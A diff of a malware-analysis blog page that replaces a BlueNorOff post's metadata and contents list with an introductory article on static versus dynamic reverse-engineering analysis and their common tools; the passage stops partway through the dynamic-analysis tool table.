@@ -8,14 +8,14 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <meta http-equiv="X-UA-Compatible" content="ie=edge" />
   
-  <title>Delving into BlueNorOff malware &middot; Malware Analysis: Or How I Learned To Love Frustration</title>
-  <meta name="title" content="Delving into BlueNorOff malware &middot; Malware Analysis: Or How I Learned To Love Frustration" />
+  <title>The difference between Dynamic and Static analysis &middot; Malware Analysis: Or How I Learned To Love Frustration</title>
+  <meta name="title" content="The difference between Dynamic and Static analysis &middot; Malware Analysis: Or How I Learned To Love Frustration" />
   
-  <meta name="description" content="In this article, we examine a newer strand of Bluenoroff malware from late 2023 on MacOS systems. It&#39;s our first look at a strand of malware from an APT." />
-  <meta name="keywords" content="MacMalware, ARMRE, ReverseEngineering, Ghidra, Bluenoroff, APT, DPRK, MacOS, " />
+  <meta name="description" content="Explaining the fundamental differences in dynamic and static analysis in reverse engineering malware samples across Windows, Mac and Nix endpoints." />
+  <meta name="keywords" content="ReverseEngineering, Training, MalwareAnalysis, Linux, MacOS, Windows, AppleSilicon, Microsoft, " />
   
   
-  <link rel="canonical" href="https://polaryse.github.io/posts/bluenoroff-malware/" />
+  <link rel="canonical" href="https://polaryse.github.io/topics/understanding_analysis/" />
   
   
   
@@ -63,45 +63,45 @@
   
   
   
-  <meta property="og:title" content="Delving into BlueNorOff malware" />
-<meta property="og:description" content="In this article, we examine a newer strand of Bluenoroff malware from late 2023 on MacOS systems. It&rsquo;s our first look at a strand of malware from an APT." />
+  <meta property="og:title" content="The difference between Dynamic and Static analysis" />
+<meta property="og:description" content="Explaining the fundamental differences in dynamic and static analysis in reverse engineering malware samples across Windows, Mac and Nix endpoints." />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://polaryse.github.io/posts/bluenoroff-malware/" /><meta property="og:image" content="https://polaryse.github.io/posts/bluenoroff-malware/featured.png" /><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2024-05-17T00:00:00+00:00" />
-<meta property="article:modified_time" content="2024-05-17T00:00:00+00:00" />
+<meta property="og:url" content="https://polaryse.github.io/topics/understanding_analysis/" /><meta property="og:image" content="https://polaryse.github.io/topics/understanding_analysis/featured.png" /><meta property="article:section" content="topics" />
+<meta property="article:published_time" content="2024-05-18T00:00:00+00:00" />
+<meta property="article:modified_time" content="2024-05-18T00:00:00+00:00" />
 
 
 
   <meta name="twitter:card" content="summary_large_image" />
-<meta name="twitter:image" content="https://polaryse.github.io/posts/bluenoroff-malware/featured.png" /><meta name="twitter:title" content="Delving into BlueNorOff malware"/>
-<meta name="twitter:description" content="In this article, we examine a newer strand of Bluenoroff malware from late 2023 on MacOS systems. It&rsquo;s our first look at a strand of malware from an APT."/>
+<meta name="twitter:image" content="https://polaryse.github.io/topics/understanding_analysis/featured.png" /><meta name="twitter:title" content="The difference between Dynamic and Static analysis"/>
+<meta name="twitter:description" content="Explaining the fundamental differences in dynamic and static analysis in reverse engineering malware samples across Windows, Mac and Nix endpoints."/>
 
   
   <script type="application/ld+json">
   [{
     "@context": "https://schema.org",
     "@type": "Article",
-    "articleSection": "Posts",
-    "name": "Delving into BlueNorOff malware",
-    "headline": "Delving into BlueNorOff malware",
+    "articleSection": "Topics",
+    "name": "The difference between Dynamic and Static analysis",
+    "headline": "The difference between Dynamic and Static analysis",
     
-    "abstract": "In this article, we examine a newer strand of Bluenoroff malware from late 2023 on MacOS systems. It\u0026rsquo;s our first look at a strand of malware from an APT.",
+    "abstract": "Explaining the fundamental differences in dynamic and static analysis in reverse engineering malware samples across Windows, Mac and Nix endpoints.",
     "inLanguage": "en",
-    "url" : "https:\/\/polaryse.github.io\/posts\/bluenoroff-malware\/",
+    "url" : "https:\/\/polaryse.github.io\/topics\/understanding_analysis\/",
     "author" : {
       "@type": "Person",
       "name": "polaryse"
     },
     "copyrightYear": "2024",
-    "dateCreated": "2024-05-17T00:00:00\u002b00:00",
-    "datePublished": "2024-05-17T00:00:00\u002b00:00",
+    "dateCreated": "2024-05-18T00:00:00\u002b00:00",
+    "datePublished": "2024-05-18T00:00:00\u002b00:00",
     
-    "dateModified": "2024-05-17T00:00:00\u002b00:00",
+    "dateModified": "2024-05-18T00:00:00\u002b00:00",
     
-    "keywords": ["MacMalware","ARMRE","ReverseEngineering","Ghidra","Bluenoroff","APT","DPRK","MacOS"],
+    "keywords": ["ReverseEngineering","Training","MalwareAnalysis","Linux","MacOS","Windows","AppleSilicon","Microsoft"],
     
     "mainEntityOfPage": "true",
-    "wordCount": "2381"
+    "wordCount": "2350"
   }]
   </script>
 
@@ -499,7 +499,7 @@
 
     
     <div class="fixed inset-x-0 top-0 h-[800px] single_hero_background nozoom"
-    style="background-image:url(/posts/bluenoroff-malware/featured_hu2f3bbc6d97dd14c3c2213f899a3a2807_635256_1200x0_resize_box_3.png);">
+    style="background-image:url(/topics/understanding_analysis/featured_hu119c08e9855d74d7175472df10b43872_322987_1200x0_resize_box_3.png);">
     
 
 
@@ -525,7 +525,7 @@
   <header id="single_header" class="mt-5 max-w-prose">
     
     <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
-      Delving into BlueNorOff malware
+      The difference between Dynamic and Static analysis
     </h1>
     <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
       
@@ -574,9 +574,9 @@
 <div class="flex flex-row flex-wrap items-center">
   
   
-  <span>2381 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">12 mins</span><span class="px-2 text-primary-500">&middot;</span><span>
+  <span>2350 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">12 mins</span><span class="px-2 text-primary-500">&middot;</span><span>
     
-    <span id="views_posts/Bluenoroff malware/index.md" 
+    <span id="views_topics/understanding_analysis/index.md" 
     
         class="animate-pulse inline-block text-transparent max-h-3 rounded-full mt-[-2px] align-middle bg-neutral-300 dark:bg-neutral-400" title="views">loading</span> 
     <span class="inline-block align-text-bottom">
@@ -589,7 +589,7 @@
 </span>
 </span><span class="px-2 text-primary-500">&middot;</span><span>
     
-    <span id="likes_posts/Bluenoroff malware/index.md" 
+    <span id="likes_topics/understanding_analysis/index.md" 
     
         class="animate-pulse inline-block text-transparent max-h-3 rounded-full mt-[-2px] align-middle bg-neutral-300 dark:bg-neutral-400" title="likes">loading</span> 
     <span class="inline-block align-text-bottom">
@@ -660,22 +660,6 @@
   
   
   
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/macmalware/&#34;,'_self');">
-    <span class="flex" style="cursor: pointer;">
-  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    MacMalware
-  </span>
-</span>
-  </span>
-  
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/armre/&#34;,'_self');">
-    <span class="flex" style="cursor: pointer;">
-  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    ARMRE
-  </span>
-</span>
-  </span>
-  
   <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/reverseengineering/&#34;,'_self');">
     <span class="flex" style="cursor: pointer;">
   <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
@@ -684,34 +668,26 @@
 </span>
   </span>
   
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/ghidra/&#34;,'_self');">
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/training/&#34;,'_self');">
     <span class="flex" style="cursor: pointer;">
   <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    Ghidra
+    Training
   </span>
 </span>
   </span>
   
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/bluenoroff/&#34;,'_self');">
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/malwareanalysis/&#34;,'_self');">
     <span class="flex" style="cursor: pointer;">
   <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    Bluenoroff
+    MalwareAnalysis
   </span>
 </span>
   </span>
   
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/apt/&#34;,'_self');">
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/linux/&#34;,'_self');">
     <span class="flex" style="cursor: pointer;">
   <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    APT
-  </span>
-</span>
-  </span>
-  
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/dprk/&#34;,'_self');">
-    <span class="flex" style="cursor: pointer;">
-  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    DPRK
+    Linux
   </span>
 </span>
   </span>
@@ -720,6 +696,30 @@
     <span class="flex" style="cursor: pointer;">
   <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
     MacOS
+  </span>
+</span>
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/windows/&#34;,'_self');">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Windows
+  </span>
+</span>
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/applesilicon/&#34;,'_self');">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    AppleSilicon
+  </span>
+</span>
+  </span>
+  
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/microsoft/&#34;,'_self');">
+    <span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Microsoft
   </span>
 </span>
   </span>
@@ -854,37 +854,21 @@
     class="min-w-[220px] py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
     <nav id="TableOfContents">
   <ul>
+    <li><a href="#what-is-static-analysis">What is Static Analysis?</a>
+      <ul>
+        <li><a href="#uses">Uses</a></li>
+        <li><a href="#advantages-and-disadvantages">Advantages and Disadvantages</a></li>
+        <li><a href="#tools">Tools</a></li>
+      </ul>
+    </li>
+    <li><a href="#what-is-dynamic-analysis">What is Dynamic Analysis?</a>
+      <ul>
+        <li><a href="#uses-1">Uses</a></li>
+        <li><a href="#advantages-and-disadvantages-1">Advantages and Disadvantages</a></li>
+        <li><a href="#tools-1">Tools</a></li>
+      </ul>
+    </li>
     <li><a href="#summary">Summary</a></li>
-    <li><a href="#hash-values">Hash Values</a></li>
-    <li><a href="#goals-of-analysis">Goals of Analysis</a></li>
-    <li><a href="#initial-analysis">Initial Analysis</a>
-      <ul>
-        <li><a href="#looking-at-virustotal">Looking at VirusTotal</a></li>
-        <li><a href="#investigating-strings">Investigating Strings</a></li>
-      </ul>
-    </li>
-    <li><a href="#static-analysis">Static Analysis</a>
-      <ul>
-        <li><a href="#command--control-infrastructure">Command &amp; Control Infrastructure</a></li>
-        <li><a href="#comms-with-c2">Comms with C2</a></li>
-      </ul>
-    </li>
-    <li><a href="#understanding-flow-of-execution">Understanding flow of execution</a>
-      <ul>
-        <li><a href="#api-calls">API calls</a></li>
-      </ul>
-    </li>
-    <li><a href="#mitre-attck-framework">MITRE ATT&amp;CK Framework</a></li>
-    <li><a href="#signatures">Signatures</a>
-      <ul>
-        <li><a href="#host-based-indicators">Host based Indicators</a></li>
-        <li><a href="#network-based-indicators">Network based Indicators</a></li>
-        <li><a href="#yara">YARA</a></li>
-      </ul>
-    </li>
-    <li><a href="#conclusion">Conclusion</a></li>
-    <li><a href="#lessons-learned">Lessons Learned</a></li>
-    <li><a href="#resources">Resources</a></li>
   </ul>
 </nav>
   </div>
@@ -898,37 +882,21 @@
     class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
     <nav id="TableOfContents">
   <ul>
+    <li><a href="#what-is-static-analysis">What is Static Analysis?</a>
+      <ul>
+        <li><a href="#uses">Uses</a></li>
+        <li><a href="#advantages-and-disadvantages">Advantages and Disadvantages</a></li>
+        <li><a href="#tools">Tools</a></li>
+      </ul>
+    </li>
+    <li><a href="#what-is-dynamic-analysis">What is Dynamic Analysis?</a>
+      <ul>
+        <li><a href="#uses-1">Uses</a></li>
+        <li><a href="#advantages-and-disadvantages-1">Advantages and Disadvantages</a></li>
+        <li><a href="#tools-1">Tools</a></li>
+      </ul>
+    </li>
     <li><a href="#summary">Summary</a></li>
-    <li><a href="#hash-values">Hash Values</a></li>
-    <li><a href="#goals-of-analysis">Goals of Analysis</a></li>
-    <li><a href="#initial-analysis">Initial Analysis</a>
-      <ul>
-        <li><a href="#looking-at-virustotal">Looking at VirusTotal</a></li>
-        <li><a href="#investigating-strings">Investigating Strings</a></li>
-      </ul>
-    </li>
-    <li><a href="#static-analysis">Static Analysis</a>
-      <ul>
-        <li><a href="#command--control-infrastructure">Command &amp; Control Infrastructure</a></li>
-        <li><a href="#comms-with-c2">Comms with C2</a></li>
-      </ul>
-    </li>
-    <li><a href="#understanding-flow-of-execution">Understanding flow of execution</a>
-      <ul>
-        <li><a href="#api-calls">API calls</a></li>
-      </ul>
-    </li>
-    <li><a href="#mitre-attck-framework">MITRE ATT&amp;CK Framework</a></li>
-    <li><a href="#signatures">Signatures</a>
-      <ul>
-        <li><a href="#host-based-indicators">Host based Indicators</a></li>
-        <li><a href="#network-based-indicators">Network based Indicators</a></li>
-        <li><a href="#yara">YARA</a></li>
-      </ul>
-    </li>
-    <li><a href="#conclusion">Conclusion</a></li>
-    <li><a href="#lessons-learned">Lessons Learned</a></li>
-    <li><a href="#resources">Resources</a></li>
   </ul>
 </nav>
   </div>
@@ -944,7 +912,315 @@
 
 
         <div class="article-content max-w-prose mb-20">
-          <h2 class="relative group">Summary 
+          <h1 class="relative group">Introduction 
+    <div id="introduction" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#introduction" aria-label="Anchor">#</a>
+    </span>        
+    
+</h1>
+<p>In this article, we will explore the fundamental differences between dynamic and static analysis. We will also discuss the advantages and disadvantages each type of analysis offers the reverse engineer. Hopefully the information provided within this blog will afford newer analysts to the field, some exposure to the tools of the trade, the thought process of analysis and a basic understanding of the reverse engineering lifecycle.</p>
+<h2 class="relative group">What is Static Analysis? 
+    <div id="what-is-static-analysis" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#what-is-static-analysis" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>Static analysis is analysis without execution. Typically, you analyse a binary through a disassembler (such as <a href="https://ghidra-sre.org/"   target="_blank">
+    Ghidra</a>) and requires a working knowledge and understanding of assembly or the language used. The goals of static analysis, as always, are completely dependent upon the point of what you are trying to achieve. This is why it is so incredibly important to leverage the scientific process to define your objectives. Not only does this ensure that you have a clear path forward, but it has the added benefit of serving as a reminder of what you are trying to achieve when you invariably get pulled down a rabbit hole when analysing a sample.</p>
+<h3 class="relative group">Uses 
+    <div id="uses" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#uses" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>Static analysis has many uses within the reverse engineering lifecycle. Most notably, it provides a platform to understand the logic involved in binary execution as well as the functions within a binary. Viewing a binary through a disassembler allows you to rename variables and functions, effectively deobfuscating the code (making it easier for you, the analyst, to read).</p>
+<p>By perusing the sample within a disassembler, you can go beyond simply understanding execution flow. This view allows you to identify encryption or compression algorithms used by the binary (if they are present). You can look for the tell-tale signs of encryption such as the presence of constants and inspect the assembly code. Additionally, this thorough inspection of functions can reveal (accidentally) compiled information inside the binary, which could help with sample attribution (as many threat actors leverage the same build info in designing their malware).</p>
+<p>This process also allows you to identify and inspect the strings present within a binary. It can also be achieved within the disassembler, or alternatively via command-line tools (conveniently called strings). This is important because the presence of some strings (such as C2 addresses, created files and persistence mechanisms) allow you to quickly identify some capability of the sample you are inspecting.</p>
+<p>When performing static analysis, the typical workflow I leverage is:</p>
+<ul>
+<li>Create a project within a disassembler (for me, this is Ghidra)</li>
+<li>Perform auto analysis of the executable using the disassembler (this prompt is provided when you are entering into the sample for the first time)</li>
+<li>Peruse the defined strings list within the binary and identify any items of interest (C2s, domain names, interesting commands, error codes, etc.)</li>
+<li>Work from the main function onwards — determine what this is and use it as a pivot point to understand other functions that are called by main</li>
+</ul>
+<p>Where this can come undone is if the malware has a config which is held within C2 infrastructure. This can impact your ability to perform static analysis and you are forced into performing dynamic analysis to retrieve the information (if the C2 is still live and can be retrieved from) to further enable your analysis.</p>
+<h3 class="relative group">Advantages and Disadvantages 
+    <div id="advantages-and-disadvantages" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#advantages-and-disadvantages" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<table>
+<thead>
+<tr>
+<th>Advantages</th>
+<th>Disadvantages</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Do not execute the binary</td>
+<td>Cannot read information stored in memory</td>
+</tr>
+<tr>
+<td>Understand execution flow</td>
+<td>A lot more effort to understand something statically than dynamically</td>
+</tr>
+<tr>
+<td>Typically you get a greater understanding through taking the time to walk through the flow of execution</td>
+<td>Can be impeded by malware that hold additional stages and configurations within C2 infrastructure</td>
+</tr>
+</tbody>
+</table>
+<p>The bottom line really is, static analysis should be used in concert with dynamic analysis.</p>
+<h3 class="relative group">Tools 
+    <div id="tools" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#tools" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>Below is a list of the typical tools that can be leveraged to perform static analysis. I have also included what type of operating system they are used for, where this is appropriate/applicable.</p>
+<blockquote>
+<p>Note that this is not a complete list of tooling available. There are many more tools you can leverage to perform static analysis and every reverse engineer has their favourites. This list will be updated and changed in accordance to my continued growth and exposure to RE.</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>Tool</th>
+<th>Operating System</th>
+<th>Type</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="https://ghidra-sre.org/"   target="_blank">
+    Ghidra</a></td>
+<td>Agnostic</td>
+<td>Disassembler</td>
+<td>Open source and freely available. This is the ideal disassembler for people who are trying out reverse engineering to see whether they want to jump into the profession.</td>
+</tr>
+<tr>
+<td><a href="https://hex-rays.com/ida-pro/"   target="_blank">
+    IDA Pro</a></td>
+<td>Agnostic</td>
+<td>Disassembler</td>
+<td>Very expensive licencing involved. This disassembler is typically leveraged by companies who hold a commercial licence. Home licences are restrictive. There is a free version but it is exceptionally limited.</td>
+</tr>
+<tr>
+<td><a href="https://binary.ninja/"   target="_blank">
+    Binary Ninja</a></td>
+<td>Agnostic</td>
+<td>Disassembler</td>
+<td>Can be expensive to licence. Like IDA, licences are annually renewed. Also typically used by companies who hold a commercial licence.</td>
+</tr>
+<tr>
+<td><a href="https://github.com/dnSpy/dnSpy"   target="_blank">
+    dnSpy</a></td>
+<td>Windows .NET</td>
+<td>Disassembler/Debugger</td>
+<td>A great disassembler for looking at Windows code. Has the added benefit of including a debugger as well, which allows you to perform dynamic analysis on .NET executables.</td>
+</tr>
+<tr>
+<td><a href="https://www.winitor.com/download"   target="_blank">
+    PEStudio</a></td>
+<td>Windows</td>
+<td>PE Header Inspector, file hashes, libraries and strings</td>
+<td>The free version of this tool is great for analysis, but interestingly, they also have a paid version (basically allowing batch mode for analysis). This program is typically used to inspect the PE header of Windows executables. It provides some great information about what is going on in the binary, including information on whether the binary is packed. Also has VirusTotal integration.</td>
+</tr>
+<tr>
+<td><a href="https://www.angusj.com/resourcehacker/"   target="_blank">
+    Resource Hacker</a></td>
+<td>Windows</td>
+<td>Windows resources (.rc files)</td>
+<td>Both a resource compiler and decompiler where you can edit and view resources in executables. It has a GUI (this is the primary way to interact with it), but also contains many command line resources.</td>
+</tr>
+</tbody>
+</table>
+<h2 class="relative group">What is Dynamic Analysis? 
+    <div id="what-is-dynamic-analysis" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#what-is-dynamic-analysis" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>If static analysis is analysis without execution, dynamic analysis is analysis through execution of a binary. Here, you can monitor changes to the network, file system, running process, file handles etc. Dynamic analysis can be anything from double-clicking the binary and allowing the malware to run on an endpoint, to working through the executable using a debugger. It allows you to coax a sample into performing its malicious actions on the endpoint, which then allows you to confirm or disprove your assumptions from previous analysis.</p>
+<h3 class="relative group">Uses 
+    <div id="uses-1" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#uses-1" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>The most interesting (and scary) aspect of dynamic analysis is actually allowing the malware to achieve its objectives through running the application on your virtual machine. There are of course risks that come with performing this analysis (and sometimes you might get a robust enough signature through pure static analysis, if you&rsquo;re lucky) because you are literally infecting your computer (and risking VM escapes in more crafty samples). Assumptions compound in static analysis, so running it dynamically actually validates them.</p>
+<p>Network connections can be viewed and established using this form of analysis, which can grant you access to additional payloads and thus, enables the analyst to develop a deeper knowledge and understanding of the sample in question (is this a dropper? Does the malware rely on a config to operate successfully?). It provides intriguing and concrete clues as to what malware type you are dealing with, and additionally, potentially the threat actor. The tooling is also significantly different and allows you to packet capture these network connections, which can be information that is unavailable in static analysis, particularly where significant obfuscation is in play.</p>
+<p>This form of analysis also provides an alternative way to analyse packed binaries — identifying the tail jump to find the original entry point, unpacking the binary for you (which can be dumped via memory) and reconstructing the import table. Additionally, you can inspect the impact the malware is having on memory addresses as you load it into a debugger and step through each function as the sample calls it.</p>
+<p>As always, it is incredibly important to ensure that you have robust notes as you step through the program. Most debuggers, like our disassemblers, will allow you to make notes via comments in the code (or have a setting in them that basically turns on comments for each instruction made by the malware, looking at you x64dbg).</p>
+<p>The &lsquo;standard operating procedure&rsquo; for dynamic analysis will depend on what platform and malware type you are dealing with. This form of analysis will require the use of many more tools (typically) than static, as you are interested in understanding impact on the endpoint and network. Typically, no less than 3 tools will be employed in any given dynamic analysis:</p>
+<ul>
+<li>Packet capturing application or command line tool to understand network connections and activities</li>
+<li>Debugger to step through and into functions, to understand their impact on disk and again network activities</li>
+<li>RegShot or something similar for Windows, to determine whether there are persistence mechanisms in the registry</li>
+<li>Sysinternal suite to look at spawned processes on a Windows endpoint, and any installed applications/programs by the malware (the impact it has on disk)</li>
+<li><a href="https://nicolargo.github.io/glances/"   target="_blank">
+    Glances</a>is a good alternative for MacOS systems to perform a similar function to the sysinternal suite</li>
+</ul>
+<h3 class="relative group">Advantages and Disadvantages 
+    <div id="advantages-and-disadvantages-1" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#advantages-and-disadvantages-1" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<table>
+<thead>
+<tr>
+<th>Advantages</th>
+<th>Disadvantages</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>You can extract information that is not available during static analysis from memory</td>
+<td>Execution of the malware requires a safe operating environment</td>
+</tr>
+<tr>
+<td>You can access network activity and create robust signatures from that information</td>
+<td>You are infecting the machine you are running the sample on</td>
+</tr>
+<tr>
+<td>You can potentially find additional malware called by the sample</td>
+<td>There could be a risk of VM escape, depending on the malware you are analysing</td>
+</tr>
+<tr>
+<td>You can determine what functions are actually being used by the malware by stepping through the program</td>
+<td>Where you cannot reconstruct the import table, it makes it quite hard to actually perform dynamic analysis</td>
+</tr>
+</tbody>
+</table>
+<h3 class="relative group">Tools 
+    <div id="tools-1" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#tools-1" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>Just like the static analysis tool set, this table is not exhaustive.</p>
+<table>
+<thead>
+<tr>
+<th>Tool</th>
+<th>Operating System</th>
+<th>Type</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="https://www.ollydbg.de/"   target="_blank">
+    Ollydbg</a></td>
+<td>Windows</td>
+<td>Debugger</td>
+<td>An older debugger that has frozen development, unfortunately. There are still aspects and plugins to this that are deeply helpful and great. Its a fantastic little debugger.</td>
+</tr>
+<tr>
+<td><a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/"   target="_blank">
+    Windbg</a></td>
+<td>Windows</td>
+<td>Debugger</td>
+<td>Microsofts answer to debugging. This has quite a steep learning curve (jn my opinion), but once you get used to it, its deeply powerful for Windows malware analysis.</td>
+</tr>
+<tr>
+<td><a href="https://x64dbg.com/"   target="_blank">
+    x32/x64dbg</a></td>
+<td>Windows</td>
+<td>Debugger</td>
+<td>A go to set of debuggers for most programs. Its designed to mirror some aspects of IDA to make it more friendly and easier to use for folks that leverage that more. Its open source, and generally a great debugger. Interestingly, this program also contains a mnemonic summary setting that basically turns on comments, telling you what is happening with each instruction in the program.</td>
+</tr>
+<tr>
+<td><a href="https://learn.microsoft.com/en-us/sysinternals/"   target="_blank">
+    Sysinternal Suite</a></td>
+<td>Windows</td>
+<td>Debugger</td>
+<td>A whole host of useful tools provided by Microsoft. There is some significant overlap here between reverse engineering and forensic analysis in terms of use. Stand out is definitely procmon, but it also includes other applications that analyse network traffic and other aspects of executables. Definitely worth installing if you are analysing Windows executables. Check out the link to learn more about all of the goodies included or simply install Flare on your VM.</td>
+</tr>
+<tr>
+<td><a href="https://www.wireshark.org/"   target="_blank">
+    Wireshark</a></td>
+<td>Agnostic</td>
+<td>Packet Capture</td>
+<td>Operating system agnostic, this program is perhaps one of the most famous of the lot and needs no introduction. A great and powerful GUI is included that enables you to do all sorts of filtering for network traffic and inspection.</td>
+</tr>
+<tr>
+<td><a href="https://polaryse.github.io/posts/applesiliconenv/"   target="_blank">
+    DNS Server</a></td>
+<td>Agnostic</td>
+<td>DNS Server</td>
+<td>Now I have placed this here as a tool because it helps perform network analysis in a closed off, safe space. By setting one of these up, you can pretend the malware can access the internet, to determine whether network connections are made. This can be a nice, safe way to assess whether the malware has multiple stages before you just open it to the internet and download additional items.</td>
+</tr>
+<tr>
+<td><a href="https://www.sourceware.org/gdb/"   target="_blank">
+    GDB</a></td>
+<td>*Nix/Windows</td>
+<td>Debugger</td>
+<td>A classic debugger available on the commandline on most nix distributions (else easily able to install). Last I heard this had not been ported to ARM and is not available on Apple Silicon devices.</td>
+</tr>
+<tr>
+<td><a href="https://lldb.llvm.org/"   target="_blank">
+    LLDB</a></td>
+<td>MacOS</td>
+<td>Debugger</td>
+<td>Next generation, high-performance debugger that is the default debugger in Xcode on MacOS. It supports debugging C, Objective-C and C++ on the desktop and iOS devices (or similar).</td>
+</tr>
+<tr>
+<td><a href="https://nicolargo.github.io/glances/"   target="_blank">
+    Glances</a></td>
+<td>MacOS/Linux</td>
+<td>Monitoring Tool</td>
+<td>Open source and written in python, this program is a nice way to get similar functionality to the sysinternal suite on MacOS and Nix systems.</td>
+</tr>
+<tr>
+<td><a href="https://github.com/Seabreg/Regshot"   target="_blank">
+    RegShot</a></td>
+<td>Windows</td>
+<td>Registry Monitoring</td>
